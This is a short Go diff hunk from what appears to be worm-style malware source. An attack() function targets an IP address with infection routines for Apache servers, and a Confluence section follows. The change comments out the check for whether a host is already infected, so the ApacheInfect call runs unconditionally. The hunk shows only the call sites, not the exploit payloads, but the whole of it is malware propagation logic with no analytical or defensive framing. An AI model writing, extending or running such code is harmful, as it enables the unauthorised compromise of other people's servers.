@@ -22,10 +22,10 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 	infected := false
 	//Apache infect
 	if ports[0] != 0 {
-		if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
+		//if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
 			infected = infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
 			//fmt.Println(infected)
-		}
+		//}
 	}
 	//Confluence infect
 	
